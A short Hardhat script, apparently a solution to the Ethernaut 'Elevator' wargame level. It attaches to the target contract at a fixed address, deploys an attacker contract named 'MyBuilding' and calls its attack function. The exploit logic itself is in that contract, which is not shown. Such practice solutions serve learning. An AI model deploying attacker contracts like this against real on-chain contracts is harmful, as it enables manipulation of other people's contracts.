import { TransactionResponse } from '@ethersproject/providers';
import { ethers } from 'hardhat';

const CONTRACT_NAME = 'Elevator';
const CONTRACT_ADDRESS = '0x41df3E71532473B24Ac4C91a3fd6DE92BfED3e83';
const ATTACKER_NAME = 'MyBuilding';

export async function main() {
  let tx: TransactionResponse;

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerFactory = await ethers.getContractFactory(ATTACKER_NAME);
  const attackerContract = await attackerFactory.deploy(contract.address);
  await attackerContract.deployed();
  await attackerContract.deployTransaction.wait(5);
  console.log('Attacker Contract deployed to:', attackerContract.address);

  tx = await attackerContract.attack(5);
  await tx.wait(2);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
